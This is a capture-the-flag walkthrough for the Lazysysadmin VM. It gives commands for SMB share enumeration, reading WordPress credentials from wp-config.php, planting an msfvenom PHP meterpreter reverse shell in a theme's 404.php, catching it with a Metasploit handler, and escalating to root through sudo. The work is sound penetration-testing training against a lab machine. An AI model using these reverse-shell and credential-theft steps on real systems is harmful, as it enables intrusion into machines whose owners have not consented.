@@ -1,0 +1,54 @@
+
+Hack the Lazysysadmin VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Lazysysadmin. The credit for making this vm machine goes to “Togie Mcdogie” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.124 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration.
+nmap -sV 192.168.1.124
+
+We find port 139 and port 445 is open, so we use smbclient to look for shared disk.
+Smbclient -L 192.168.1.124
+After finding the shared drive we use smbclient to access the shared folder.
+smbclient \\192.168.1.124\share$
+
+Searching through the files we find wordpress folder. In the wordpress folder, we download the wp-config.php file to find the password and username.
+
+In the wp-config.php file we find the username and password for wordpress login.
+
+Now we use dirb to find the wordpress page, as the default page on the server is not based on wordpress.
+dirb http://192.168.1.124
+
+Now after finding the wordpress page we open admin login page. We access the admin dashboard using the username and password we found earlier in the wp-config.php file.
+We then create a php payload using msfvenom and replace the 404.php page in themes with the code of our payload.
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.109 lport=4444 -f raw
+
+We set up our listener using metasploit.
+msf > use exploit/multi/handler
+msf exploit(handler) > set lhost 192.168.1.109
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > run
+
+We then call the 404.php page to start our session. The 404.php page can be found in /wp-content/themes/twentyfifteen/404.php
+As soon as our payload is executed we get our reverse shell.
+
+After searching through the files, we didn’t find anything. So we go back to the shared folder and in there we download a file called deets.txt
+
+When we open the file we find password for some user.
+
+We open the /etc/passwd file on the VM to find the name of the users.
+
+When we switch users we are prompted by an error message to use terminal, so we spawn /bin/bash using python.
+Then we switch user to togie and use the password we find in deets.txt file
+su – togie
+
+We then look into sudoers and find that we have all the privileges of root user so we switch to root.
+sudo -l
+sudo su
+
+So we switch to root and go into root folder. There we find a file called proof.txt, we open the file and are greeted with a message congratulating for the completion of the CTF challenge.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
